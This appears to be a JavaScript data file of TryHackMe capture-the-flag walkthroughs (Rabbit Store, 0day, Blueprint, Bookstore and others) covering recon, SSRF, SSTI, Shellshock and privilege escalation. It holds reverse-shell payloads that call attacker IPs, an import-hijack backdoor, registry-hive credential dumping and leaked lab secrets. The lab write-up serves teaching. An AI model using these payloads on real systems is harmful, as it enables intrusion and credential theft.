      { type: "heading", content: "10) Privilege Escalation (Part 2  - Cron + Python hijack)" },
      { type: "text", content: "As valley, we still don't get sudo. So we hunt for root automation: cron jobs, systemd timers, backups, scripts, writable paths." },
      { type: "code", content: "cat /etc/crontab" },
      { type: "image", content: "Pasted image 20260216191259.png", alt: "Crontab screenshot" },
      { type: "text", content: "We spot a root-run Python script: /photos/script/photosEncrypt.py" },
      { type: "image", content: "Pasted image 20260216191414.png", alt: "photosEncrypt.py screenshot" },
      { type: "callout", content: "Pointer: If a root Python script imports a module and you can write to that module's file, you can hijack the import and execute code as root when the cron runs." },
      { type: "text", content: "The script imports base64, so we locate the module on disk and check permissions:" },
      { type: "code", content: "locate base64.py\nls -l /usr/lib/python3.8/base64.py" },
      { type: "image", content: "Pasted image 20260216191540.png", alt: "base64.py permissions screenshot" },
      { type: "text", content: "base64.py is writable. We add a reverse shell payload inside it." },
      { type: "code", content: "# Listener (your machine):\nnc -lvnp 1234\n\n# Payload (insert into /usr/lib/python3.8/base64.py):\nimport socket\nimport subprocess\nimport os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"192.168.184.65\", 1234))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nimport pty; pty.spawn(\"/bin/sh\")" },
      { type: "image", content: "Pasted image 20260216192129.png", alt: "Reverse shell screenshot" },
      { type: "text", content: "After the cron executes the root Python script, we receive a root shell. Then we read the root flag and finish the room." },
      { type: "image", content: "Pasted image 20260216192215.png", alt: "Root flag screenshot" },
      { type: "callout", content: "Takeaways: Client-side auth (JS validation) leaks secrets • Credential reuse turns small leaks into full compromise • PCAPs often contain plaintext credentials • Writable Python libs + root cron = instant privilege escalation." },
    ],
  },
  "rabbitstore": {
    title: "Rabbit Store",
    meta: "TryHackMe • Linux • Medium",
    slug: "rabbitstore",
    baseImageUrl: "/labs/Tryhackme/Rabbitstore/",
    sections: [
      { type: "heading", content: "Goal" },
      { type: "list", content: "", items: [
        "User flag",
        "Root flag"
      ]},
      { type: "text", content: "Target: cloudsite.thm / storage.cloudsite.thm" },

      { type: "heading", content: "0) Hostname setup" },
      { type: "text", content: "The box uses virtual hosts. Before you start browsing, map the target IP to the domains used by the app." },
      { type: "code", content: "sudo vim /etc/hosts\n\n10.80.139.58 cloudsite.thm www.cloudsite.thm" },

      { type: "heading", content: "1) Recon" },
      { type: "text", content: "Start broad: scan all TCP ports and grab service/version info." },
      { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap 10.80.139.58" },
      { type: "image", content: "Pasted image 20260217112240.png", alt: "Nmap results: SSH + HTTP, plus Erlang/RabbitMQ-related ports" },
      { type: "text", content: "The normal services are there (22 SSH, 80 HTTP), but the real items are the Erlang/RabbitMQ ports:" },
      { type: "list", content: "", items: [
        "4369  - EPMD (Erlang Port Mapper Daemon)",
        "25672  - Erlang distribution / RabbitMQ clustering"
      ]},
      { type: "callout", content: "Pointer: When you see Erlang ports, assume a hidden \"cookie\" is the key. You often won't exploit these directly from the outside  - usually you first gain a foothold, then steal .erlang.cookie." },

      { type: "heading", content: "2) Web enumeration" },
      { type: "text", content: "Quick directory fuzzing against the main vhost." },
      { type: "code", content: "ffuf -u http://cloudsite.thm/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -fc 404 -s -e .php,.txt,.html" },
      { type: "image", content: "Pasted image 20260217112153.png", alt: "ffuf results" },
      { type: "text", content: "/assets exists, but doesn't lead to an obvious vulnerability. So we pivot to the login/register flow." },

      { type: "heading", content: "3) Broken access control → \"active\" subscription" },
      { type: "text", content: "The login/register link pushes us to a different host, so we add another vhost entry:" },
      { type: "code", content: "sudo vim /etc/hosts\n\n10.80.139.58 storage.cloudsite.thm www.storage.cloudsite.thm" },
      { type: "text", content: "Register a normal user first to see the baseline behavior." },
      { type: "image", content: "Pasted image 20260217115456.png", alt: "Registration page" },
      { type: "text", content: "After login, the app blocks us because the account is \"inactive\"." },
      { type: "image", content: "Pasted image 20260217115527.png", alt: "Inactive message" },
      { type: "text", content: "Cookies include a JWT. Decoding it reveals fields like the email and subscription state." },
      { type: "image", content: "Pasted image 20260217115705.png", alt: "JWT decoded" },
      { type: "callout", content: "Pointer: If the app uses JWTs, first question: \"Can I set privileged fields earlier (registration / profile update)?\"" },
      { type: "text", content: "We intercept the register request and inject a subscription field:" },
      { type: "image", content: "Pasted image 20260217115936.png", alt: "Burp intercept register" },
      { type: "code", content: "// Baseline:\n{\"email\": \"admin2@example.com\", \"password\": \"admin\"}\n\n// Upgraded:\n{\"email\": \"admin2@example.com\", \"password\": \"admin\", \"subscription\": \"active\"}" },
      { type: "callout", content: "Pointer: This is a classic server-side validation failure. Privileged fields must be computed server-side, not trusted from client JSON." },

      { type: "heading", content: "4) Portal access + first attempts" },
      { type: "text", content: "Login with the new \"active\" account and the portal opens." },
      { type: "image", content: "Pasted image 20260217120336.png", alt: "Storage dashboard" },
      { type: "text", content: "Three primary features: Upload file, Upload from URL (often SSRF), View/list uploads." },
      { type: "text", content: "Uploading an executable payload doesn't work  - the server renames files and strips extensions." },
      { type: "image", content: "Pasted image 20260217120601.png", alt: "Upload extension stripped" },
      { type: "callout", content: "Pointer: When upload execution is blocked, features like \"fetch from URL\" can be far more dangerous than uploads." },
      { type: "text", content: "The routing suggests an API backing the portal, so we fuzz under /api." },
      { type: "image", content: "Pasted image 20260217121056.png", alt: "API fuzz" },
      { type: "text", content: "/api/docs looks promising, but we're blocked:" },
      { type: "image", content: "Pasted image 20260217121043.png", alt: "API docs denied" },
      { type: "callout", content: "Pointer: Internal docs are gold. If you can SSRF into them, you often skip hours of guessing endpoints/params." },

      { type: "heading", content: "5) SSRF via \"Upload from URL\"" },
      { type: "text", content: "The \"store URL\" feature lets the server fetch a URL and store it. The internal service is on a different port, so we port-hunt through SSRF." },
      { type: "code", content: "import requests\nfrom concurrent.futures import ThreadPoolExecutor\nimport sys\n\nTARGET = \"http://storage.cloudsite.thm/api/store-url\"\nJWT = \"<your_jwt_cookie_value_here>\"\n\nports = range(1, 65535)\ncookies = {\"jwt\": JWT}\nheaders = {\"Content-Type\": \"application/json\"}\n\ndef scan(port: int):\n    payload = {\"url\": f\"http://localhost:{port}/\"}\n    try:\n        r = requests.post(TARGET, headers=headers, cookies=cookies, json=payload, timeout=3)\n        if r.status_code != 401 and len(r.text) != 41:\n            print(f\"[+] Interesting port {port}: status={r.status_code}, size={len(r.text)}\")\n    except Exception:\n        pass\n\nprint(\"[*] Starting SSRF port scan...\")\nwith ThreadPoolExecutor(max_workers=100) as ex:\n    ex.map(scan, ports)" },
      { type: "image", content: "Pasted image 20260217130104.png", alt: "SSRF port scan output" },
      { type: "text", content: "Port 3000 reveals the internal API docs." },
      { type: "image", content: "Pasted image 20260217130319.png", alt: "Internal API docs page 1" },
      { type: "image", content: "Pasted image 20260217130337.png", alt: "Internal API docs page 2" },
      { type: "text", content: "The endpoint we care about: /api/fetch_messeges_from_chatbot (typo included)." },
      { type: "image", content: "Pasted image 20260217130720.png", alt: "Calling the chatbot endpoint in Burp" },
      { type: "text", content: "It reflects our input back:" },
      { type: "image", content: "Pasted image 20260217130758.png", alt: "Reflected input" },
      { type: "callout", content: "Pointer: Reflection isn't automatically SSTI  - but it's enough to justify a low-noise template probe." },

      { type: "heading", content: "6) SSTI → RCE → user flag" },
      { type: "text", content: "Probe for SSTI (polyglot):" },
      { type: "image", content: "Pasted image 20260217131028.png", alt: "SSTI polyglot test" },
      { type: "text", content: "Confirm engine with arithmetic:" },
      { type: "code", content: "{{7*7}}" },
      { type: "image", content: "Pasted image 20260217131132.png", alt: "7*7 works  - Jinja2 confirmed" },
      { type: "text", content: "Escalate to OS command execution:" },
      { type: "code", content: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
      { type: "image", content: "Pasted image 20260217131402.png", alt: "RCE confirmed" },
      { type: "callout", content: "Pointer: Always prove execution with something safe (id/whoami). Then switch to a reverse shell." },
      { type: "text", content: "Start a listener and trigger a shell:" },
      { type: "code", content: "nc -lvnp 1234\n\n{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <YOUR_IP> 1234 >/tmp/f').read()}}" },
      { type: "image", content: "Pasted image 20260217132037.png", alt: "Reverse shell triggered" },
      { type: "image", content: "Pasted image 20260217132116.png", alt: "Interactive shell on target" },
      { type: "text", content: "Grab the user flag:" },
      { type: "image", content: "Pasted image 20260217132144.png", alt: "User flag obtained" },

      { type: "heading", content: "7) PrivEsc: Erlang cookie → RabbitMQ admin → root" },
      { type: "text", content: "Those Erlang ports we saw earlier become useful once we obtain the shared cookie file." },
      { type: "text", content: "Locate .erlang.cookie:" },
      { type: "image", content: "Pasted image 20260217132718.png", alt: "Cookie file discovered" },
      { type: "code", content: "Cookie value: wNkProKxfl30BVjY" },
      { type: "callout", content: "Pointer: If you ever see .erlang.cookie readable by your current user, that's usually game-changing. Treat it like a password for RabbitMQ's internal communication." },
      { type: "text", content: "Use Erlang distribution helper (shell-erldp):" },
      { type: "code", content: "python2 shell-erldp.py 10.80.139.58 25672 wNkProKxfl30BVjY" },
      { type: "image", content: "Pasted image 20260217143836.png", alt: "Shell obtained as RabbitMQ service user" },
      { type: "text", content: "Fix cookie permissions:" },
      { type: "code", content: "chmod 600 .erlang.cookie" },
      { type: "image", content: "Pasted image 20260217144232.png", alt: "Cookie permissions adjusted" },
      { type: "text", content: "Create a RabbitMQ administrator user:" },
      { type: "code", content: "rabbitmqctl add_user <username> <password>\nrabbitmqctl set_user_tags <username> administrator" },
      { type: "image", content: "Pasted image 20260217144625.png", alt: "New RabbitMQ admin user created" },
      { type: "text", content: "Extract root's stored hash:" },
      { type: "image", content: "Pasted image 20260217144904.png", alt: "Root hash recovered" },
      { type: "code", content: "{\n  \"name\":\"root\",\n  \"password_hash\":\"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF\",\n  \"hashing_algorithm\":\"rabbit_password_hashing_sha256\",\n  \"tags\":[\"administrator\"],\n  \"limits\":{}\n}" },
      { type: "text", content: "Decode base64 and split salt/hash:" },
      { type: "code", content: "import base64, binascii\n\nhash_b64 = \"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF\"\nraw = base64.b64decode(hash_b64)\n\nsalt = raw[:4]\ndigest = raw[4:]\n\nprint(\"Salt:\", binascii.hexlify(salt).decode())\nprint(\"Hash:\", binascii.hexlify(digest).decode())" },
      { type: "image", content: "Pasted image 20260217151115.png", alt: "Decoded salt + SHA-256 digest" },
      { type: "text", content: "Switch to root:" },
      { type: "code", content: "su - root" },
      { type: "image", content: "Pasted image 20260217151151.png", alt: "Root access achieved" },
      { type: "callout", content: "Final takeaways: Registration endpoints matter  - if the server trusts client JSON fields, roles can be self-assigned • SSRF unlocks internal-only docs + admin APIs • SSTI is a fast escalation chain: reflection → evaluation → RCE → shell • Erlang cookie is critical: once leaked, RabbitMQ internals become reachable." },
    ],
  },
"0day": {
  title: "0day",
  meta: "TryHackMe • Linux • Easy",
  slug: "0day",
  baseImageUrl: "/labs/Tryhackme/0day/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: ["user.txt", "root.txt"] },

    { type: "heading", content: "1) nmap" },
    { type: "image", content: "Pasted image 20260222170533.png", alt: "Initial recon / landing page" },
    { type: "text", content: "The landing page didn’t really have anything useful, so I went straight to recon. I ran Nmap first, and at the same time I planned to do web enumeration with FFUF." },
    { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap  10.114.170.191" },
    { type: "image", content: "Pasted image 20260222170755.png", alt: "Nmap output" },
    { type: "text", content: "Nothing obvious came out of the scan for a quick win, so I focused on finding hidden web paths." },
    { type: "callout", content: "Pointer: If the main page looks boring, don’t overthink it  - fuzz for hidden paths early. CTF boxes love hiding the real entry under /cgi-bin, /admin, /backup, etc." },

    { type: "heading", content: "2) ffuf" },
    { type: "text", content: "Directory fuzzing to see what’s actually exposed on the web server:" },
    { type: "code", content: "ffuf -u 'http://10.114.170.191/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .html,.txt,.php -s" },
    { type: "image", content: "Pasted image 20260222170900.png", alt: "FFUF results" },
    { type: "text", content: "FFUF gave a few quick hits:" },
    { type: "code", content: "/cgi-bin/ - 404 Forbidden\n/admin/ - Returns blank page\n/backup/ - RSA Private key, We cant use it\n/uploads/ - Returns blank pag\n/secret/ - Returns an image, But its useless, I tried to check it but no luck, (Binwalk/ metadata/ strings, etc)\n/robots.txt - \"You really thought it'd be this easy?\"" },
    { type: "callout", content: "Pointer: Any mention of /cgi-bin is a big hint. Even if it says forbidden, it’s still worth checking for old CGI bugs (Shellshock is a classic)." },

    { type: "heading", content: "3) nikto" },
    { type: "text", content: "At this point I ran Nikto just to see if it flags anything obvious on the web server." },
    { type: "code", content: "nikto -h 10.114.170.191" },
    { type: "image", content: "Pasted image 20260222172239.png", alt: "Nikto scan output" },
    { type: "text", content: "Nikto showed a Shellshock finding, so I checked exploits with searchsploit and tried a working payload against the target." },
    { type: "image", content: "Pasted image 20260222172550.png", alt: "Searchsploit results for Shellshock" },
    { type: "image", content: "Pasted image 20260222172601.png", alt: "Shellshock exploit details" },
    { type: "image", content: "Pasted image 20260222172708.png", alt: "Shellshock working against the target" },
    { type: "callout", content: "Pointer: Before going straight for a shell, test with something safe like `id` / `whoami`. If you get output back, then upgrade to a reverse shell." },

    { type: "heading", content: "4) Reverse shell" },
    { type: "text", content: "Once I confirmed Shellshock works, I used a curl User-Agent payload to pop a reverse shell." },
    { type: "code", content: "curl -A \"() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.141.103/1236 0>&1\" http://10.114.170.191/cgi-bin/test.cgi" },
    { type: "image", content: "Pasted image 20260222173003.png", alt: "Reverse shell curl request" },
    { type: "image", content: "Pasted image 20260222173025.png", alt: "Reverse shell session" },
    { type: "text", content: "After the shell landed, I grabbed the user flag (user.txt)." },
    { type: "callout", content: "Pointer: If the shell feels unstable, upgrade it (pty spawn) before doing privesc. It saves a lot of pain later." },

    { type: "heading", content: "5) Privilege Escalation" },
    { type: "text", content: "For privesc, I just went with linpeas.sh to get a quick list of potential vectors." },
    { type: "text", content: "Transferred it using netcat:" },
    { type: "code", content: "Local machine: nc 10.114.170.191 4444 < linpeas.sh \nVictim machine: nc -lp 4444 > linpeas.sh" },
    { type: "image", content: "Pasted image 20260222173306.png", alt: "Transferring linpeas.sh" },
    { type: "image", content: "Pasted image 20260222173349.png", alt: "linpeas output / findings" },
    { type: "text", content: "linpeas pointed me to this exploit: `https://www.exploit-db.com/exploits/37292`. I grabbed it and transferred it over with ncat." },
    { type: "image", content: "Pasted image 20260222174417.png", alt: "Exploit transferred to the target" },

    { type: "text", content: "When I tried compiling it, I hit an error (PATH issue)." },
    { type: "image", content: "Pasted image 20260222174456.png", alt: "Compile error" },
    { type: "text", content: "Fix was just setting a proper PATH:" },
    { type: "code", content: "export PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/bin:/sbin" },
    { type: "image", content: "Pasted image 20260222174811.png", alt: "PATH fixed" },
    { type: "callout", content: "Pointer: If something “should compile” but doesn’t, check the boring stuff first (PATH, missing gcc/make, permissions). It’s usually that." },

    { type: "text", content: "After that, the exploit worked and I was able to read root.txt." },
    { type: "image", content: "Pasted image 20260222175028.png", alt: "Root flag" },
  ],
},

"blueprint": {
  title: "Blueprint",
  meta: "TryHackMe • Linux • Easy",
  slug: "blueprint",
  baseImageUrl: "/labs/Tryhackme/Blueprint/",
  sections: [
    { type: "heading", content: "0)  Questions:" },
    { type: "list", content: "", items: ["\"Lab\" user NTLM hash decrypted", "root.txt"] },

    { type: "heading", content: "1) NMAP:" },
    { type: "text", content: "Started with a full port scan to see what’s exposed." },
    { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap  10.113.179.206" },

    { type: "text", content: "Open ports found:" },
    { type: "code", content: "Discovered open port 80/tcp on 10.113.179.206\nDiscovered open port 135/tcp on 10.113.179.206\nDiscovered open port 139/tcp on 10.113.179.206\nDiscovered open port 443/tcp on 10.113.179.206\nDiscovered open port 445/tcp on 10.113.179.206\nDiscovered open port 3306/tcp on 10.113.179.206\nDiscovered open port 8080/tcp on 10.113.179.206\nDiscovered open port 49152/tcp on 10.113.179.206\nDiscovered open port 49153/tcp on 10.113.179.206\nDiscovered open port 49154/tcp on 10.113.179.206\nDiscovered open port 49158/tcp on 10.113.179.206\nDiscovered open port 49160/tcp on 10.113.179.206\nDiscovered open port 49159/tcp on 10.113.179.206" },

    { type: "text", content: "The most interesting one was port 8080. Version detection showed it was HTTP and it had a directory listing with osCommerce files." },
    { type: "code", content: "8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)\n| http-methods: \n|   Supported Methods: OPTIONS GET HEAD POST TRACE\n|_  Potentially risky methods: TRACE\n|_http-title: Index of /\n| http-ls: Volume /\n| SIZE  TIME              FILENAME\n| -     2019-04-11 22:52  oscommerce-2.3.4/\n| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/\n| -     2019-04-11 22:52  oscommerce-2.3.4/docs/" },

    { type: "callout", content: "Pointer: If you see \"Index of /\" plus a clear app/version (osCommerce 2.3.4 here), don’t guess. Search exploits for that exact version and try those first." },
    { type: "callout", content: "Pointer: Ports 135/139/445 usually mean Windows/SMB. Even if web gets you in, it’s useful later for credential dumping and post-exploitation." },

    { type: "heading", content: "2) Remote code execution, Into rev shell" },
    { type: "text", content: "I checked port 8080 first. The catalog folder looked like the actual site, and since we already knew the CMS (osCommerce), I used searchsploit." },
    { type: "image", content: "Pasted image 20260222141217.png", alt: "Searching for osCommerce exploits" },

    { type: "text", content: "There were multiple vulnerabilities listed (file upload and RCE). I went with RCE first. If that didn’t work, I planned to fall back to file upload." },
    { type: "text", content: "Pulled the exploit locally:" },
    { type: "code", content: "searchsploit -m php/webapps/44374.py" },
    { type: "image", content: "Pasted image 20260222141534.png", alt: "Exploit copied locally" },

    { type: "text", content: "Then I edited it to match the target. The main thing was fixing the base URL so it points to the box on port 8080." },
    { type: "code", content: "10.113.179.206:8080" },

    { type: "text", content: "So it goes from:" },
    { type: "image", content: "Pasted image 20260222141637.png", alt: "Exploit before editing base URL" },
    { type: "text", content: "To:" },
    { type: "image", content: "Pasted image 20260222141739.png", alt: "Exploit after editing base URL" },

    { type: "text", content: "That one didn’t work as planned, so I tried the second RCE option instead." },
    { type: "image", content: "Pasted image 20260222142035.png", alt: "Second RCE attempt" },

    { type: "text", content: "This time it worked and I got a shell. Even better, it dropped me in as Administrator." },
    { type: "image", content: "Pasted image 20260222142148.png", alt: "Shell gained as Administrator" },

    { type: "callout", content: "Pointer: If you land a shell and it’s already high-privileged, confirm it (whoami) and then grab what you need quickly (flags + creds) before you start experimenting." },

    { type: "heading", content: "3) Inside the system" },
    { type: "text", content: "Since I was already Administrator, the root flag was basically done. The main remaining task was extracting the \"Lab\" user NTLM hash and decrypting it." },

    { type: "text", content: "I used the standard SAM/SYSTEM/SECURITY hive method using reg.exe:" },
    { type: "code", content: "C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save\nC:\\> reg.exe save hklm\\security c:\\temp\\security.save\nC:\\> reg.exe save hklm\\system c:\\temp\\system.save" },

    { type: "image", content: "Pasted image 20260222143413.png", alt: "Saving registry hives (SAM)" },
    { type: "image", content: "Pasted image 20260222143422.png", alt: "Saving registry hives (SECURITY/SYSTEM)" },
    { type: "text", content: "After running those, I had all three files saved." },
    { type: "image", content: "Pasted image 20260222143627.png", alt: "All three hive files created" },

    { type: "text", content: "Then I downloaded them through the website using this path:" },
    { type: "code", content: "/catalog/install/includes" },
    { type: "image", content: "Pasted image 20260222143643.png", alt: "Downloading saved hives via the web directory" },

    { type: "callout", content: "Pointer: If SMB copy is annoying or blocked, exfil via a reachable web directory works fine. Just don’t overwrite anything the app needs." },

    { type: "text", content: "After downloading the hives, I used secretsdump to extract the hashes." },
    { type: "code", content: "wget https://github.com/fin3ss3g0d/secretsdump.py/blob/main/secretsdump.py" },
    { type: "image", content: "Pasted image 20260222143944.png", alt: "secretsdump extracting hashes" },

    { type: "text", content: "That gave me the \"Lab\" user hash. The question wanted it decrypted, so I tried CrackStation first (if it failed, I would’ve switched to hashcat or john)." },
    { type: "image", content: "Pasted image 20260222144121.png", alt: "CrackStation cracking the NTLM hash" },
    { type: "text", content: "Luckily, CrackStation worked, so that finished the first question." },

    { type: "callout", content: "Pointer: Always try the easy stuff first (CrackStation / common wordlists). If it doesn’t crack fast, move to hashcat with rules or masks." },

    { type: "heading", content: "4) root.txt" },
    { type: "image", content: "Pasted image 20260222145358.png", alt: "Root flag location on Administrator desktop" },
    { type: "text", content: "Root flag:" },
    { type: "code", content: "more C:\\users\\Administrator\\Desktop\\root.txt.txt\n\nTHM{aea1e3ce6fe7f89e10cea833ae009bee}" },

  ],
},

"bookstore": {
  title: "Bookstore",
  meta: "TryHackMe • Linux • Medium",
  slug: "bookstore",
  baseImageUrl: "/labs/Tryhackme/Bookstore/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: ["User flag", "Root flag", "Target: 10.114.188.53"] },

    { type: "heading", content: "1) NMAP" },
    { type: "text", content: "As usual, I started with Nmap (and planned to run FFUF alongside it). I wanted a full port picture first so I don’t miss any weird web/API ports." },
    { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap 10.114.188.53" },
    { type: "text", content: "Quick flag context (just so it’s clear what I’m doing):" },
    { type: "code", content: "-T4   : faster timing\n-p-   : scan all TCP ports\n-A    : aggressive scan (scripts + OS detection; sometimes you can skip it)\n-r    : scan ports in order\n-Pn   : skip ping/host discovery\n-v    : verbose output\n-sV   : service/version detection\n-oN   : save output to a file" },
    { type: "text", content: "Nmap came back with 5 open ports." },
    { type: "image", content: "Pasted image 20260222150849.png", alt: "Nmap results showing open ports" },
    { type: "text", content: "One thing immediately stood out: port 5000 had an API route, so I knew I’d probably end up spending time there. Before clicking around too much, I fuzzed both web ports (80 and 5000)." },
    { type: "callout", content: "Pointer: If you see a second web port (like 5000), treat it like a separate app. Fuzz it separately and don’t assume it has the same routes as port 80." },

    { type: "heading", content: "2) FFUF" },
    { type: "text", content: "I fuzzed both ports using the same wordlist and a few common extensions." },
    { type: "code", content: "ffuf -u http://10.114.188.53/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .txt,.html,.php -s\n\nffuf -u http://10.114.188.53:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .txt,.html,.php -s" },

    { type: "text", content: "Port 80 gave me a few hits: a login page plus static folders (images and assets)." },
    { type: "image", content: "Pasted image 20260222151916.png", alt: "FFUF results on port 80 (login.html, images, assets)" },

    { type: "text", content: "I checked the login page first." },
    { type: "image", content: "Pasted image 20260222152142.png", alt: "login.html page" },
    { type: "text", content: "It felt like a dead-end: register didn’t work, I didn’t have creds, and basic SQL injection attempts didn’t go anywhere." },

    { type: "text", content: "So I did the boring-but-useful thing: checked page source." },
    { type: "image", content: "Pasted image 20260222152155.png", alt: "Page source hint pointing to assets" },
    { type: "text", content: "The images folder didn’t matter, but the assets folder ended up being the real lead." },
    { type: "callout", content: "Pointer: If login is a dead-end, check the JS. Frontend code leaks API routes and sometimes even security comments (like old vulnerable endpoints)." },

    { type: "heading", content: "3) Trying to get into login" },
    { type: "text", content: "Inside the assets folder, I checked the JS files and found one called api.js." },
    { type: "image", content: "Pasted image 20260222152403.png", alt: "assets/js showing api.js" },
    { type: "text", content: "At first I thought it would just repeat what Nmap already told me (host + port). But the file contents were actually useful." },
    { type: "image", content: "Pasted image 20260222152440.png", alt: "api.js contents showing API structure and comments" },

    { type: "text", content: "The important part was a comment at the end saying the previous API version had a parameter that caused a local file inclusion / arbitrary file read issue. That was basically my next objective: find the old API version and abuse it to read a file." },
    { type: "text", content: "Since I already fuzzed port 5000, I checked those results next." },
    { type: "image", content: "Pasted image 20260222152627.png", alt: "FFUF results on port 5000 showing a console route" },

    { type: "text", content: "There was a console endpoint. When I opened it, it asked for a PIN." },
    { type: "image", content: "Pasted image 20260222152746.png", alt: "Console page asking for a PIN" },

    { type: "text", content: "So the plan was simple:" },
    { type: "list", content: "", items: [
      "Find the old API version + the vulnerable parameter that allows arbitrary file read",
      "Use it to read sid’s bash history and grab the PIN",
      "Use the PIN to get into the console"
    ]},

    { type: "heading", content: "4) API Enumeration" },
    { type: "text", content: "Visiting the API root shows the public structure, but it didn’t look like the full story (usually full APIs are documented more cleanly or returned as JSON)." },
    { type: "image", content: "Pasted image 20260222152914.png", alt: "API structure page on port 5000" },
    { type: "text", content: "I started poking the versioned paths. I also noticed requests referencing v2, so I tried to find which older version still existed." },

    { type: "text", content: "I tried fuzzing the parameter name while attempting a file read payload (aiming at sid’s bash history):" },
    { type: "code", content: "ffuf -u 'http://10.114.188.53:5000/api/v2/resources/books?FUZZ=../../../home/sid/.bash_history' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -s" },

    { type: "text", content: "That didn’t immediately give me what I wanted, so I stepped back and looked at the path again. The v2 part stood out." },
    { type: "text", content: "I tried older versions (v1 / v0), and that was the right move  - I found another endpoint quickly." },
    { type: "image", content: "Pasted image 20260222155007.png", alt: "Finding the older API version endpoint" },

    { type: "text", content: "From there, I used the file read to pull the bash history and got the PIN." },
    { type: "image", content: "Pasted image 20260222155112.png", alt: "File read output showing the PIN in bash history" },
    { type: "callout", content: "Pointer: When APIs are versioned, always try older versions. It’s super common for v2 to be patched while v1/v0 is still deployed." },
    { type: "text", content: "PIN found:" },
    { type: "code", content: "123-321-135" },

    { type: "heading", content: "5) Reverse shell" },
    { type: "text", content: "With the PIN, I could finally access the console." },
    { type: "image", content: "Pasted image 20260222155223.png", alt: "Console unlocked with PIN" },

    { type: "text", content: "The console runs Python expressions in the application context (basically an eval box). That’s enough to get code execution, so I grabbed a Python reverse shell payload from revshells and used it there." },
    { type: "image", content: "Pasted image 20260222155403.png", alt: "Python reverse shell payload used in console" },

    { type: "text", content: "That dropped me into a shell as the sid user." },
    { type: "image", content: "Pasted image 20260222155601.png", alt: "Shell as sid + user flag" },
    { type: "callout", content: "Pointer: If a web console says “expressions in app context”, assume it’s dangerous. Even limited eval usually leads to full RCE if you can import os/subprocess or reach builtins." },

    { type: "heading", content: "6) Privilege escalation" },
    { type: "text", content: "While enumerating as sid, I noticed a file named try-harder. It was owned by root and it’s an ELF binary, so I pulled it locally and opened it in Ghidra." },
    { type: "image", content: "Pasted image 20260222160022.png", alt: "try-harder binary analysis in Ghidra" },

    { type: "text", content: "Ghidra showed a simple check: if the calculated value matches the hex value 0x5dcd21f4, it runs a privileged action (root shell)." },
    { type: "text", content: "The flow was basically:" },
    { type: "list", content: "", items: [
      "It sets a value (local_18) to 0x5db3",
      "It reads our number into a variable (local_1c)",
      "Then it computes something like: (our_input XOR 0x1116 XOR 0x5db3)",
      "If the result equals 0x5dcd21f4 → we win"
    ]},

    { type: "text", content: "This is just XOR math. Since XOR is reversible, we can solve for the input:" },
    { type: "code", content: "Input = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3" },
    { type: "callout", content: "Pointer: XOR is your friend here. If the program does (input ^ A ^ B) == TARGET, then input == TARGET ^ A ^ B." },

    { type: "text", content: "I used a tiny Python snippet to calculate the exact number to enter:" },
    { type: "code", content: "magic_number = 0x5dcd21f4\nxor1 = 0x1116\nxor2 = 0x5db3\n\ninp = magic_number ^ xor1 ^ xor2\nprint(inp)" },

    { type: "image", content: "Pasted image 20260222163046.png", alt: "Calculated magic input value" },
    { type: "text", content: "Entered the computed value into try-harder and it popped root." },
    { type: "image", content: "Pasted image 20260222163128.png", alt: "Privilege escalation success (root)" },
    { type: "image", content: "Pasted image 20260222163145.png", alt: "Root flag / proof of root access" },
  ],
},

"mr-robot": {
  title: "Mr Robot",
  meta: "TryHackMe • Linux • Medium",
  slug: "mrrobot",
  baseImageUrl: "/labs/Tryhackme/MrRobot/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: ["What is key 1?", "What is key 2?", "What is key 3?"] },

    { type: "heading", content: "1) Web page" },
    { type: "image", content: "Pasted image 20260222202116.png", alt: "Landing page" },
    { type: "text", content: "The landing page didn’t really show anything useful, so I moved on to recon and directory fuzzing." },
    { type: "callout", content: "Pointer: If the homepage is empty or just a theme page, don’t waste time  - scan + fuzz early." },

    { type: "heading", content: "2) nmap" },
    { type: "code", content: "nmap -T4 -p- -A -r -v -sV -oN scan.nmap 10.114.186.95" },
    { type: "image", content: "Pasted image 20260222202806.png", alt: "Nmap results" },
    { type: "text", content: "Nmap didn’t give me anything immediately exploitable, so the next step was web enumeration." },

    { type: "heading", content: "3) ffuf" },
    { type: "code", content: "ffuf -u 'http://10.114.186.95/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .html,.txt,.php -s" },
    { type: "text", content: "FFUF was way more useful here than Nmap." },
    { type: "image", content: "Pasted image 20260222202937.png", alt: "FFUF results showing many hits" },
    { type: "text", content: "I got a bunch of hits right away, and it was clear this was WordPress." },

    { type: "text", content: "First thing I did was check the WordPress login page and see how it responds." },
    { type: "image", content: "Pasted image 20260222203104.png", alt: "WordPress login error output" },
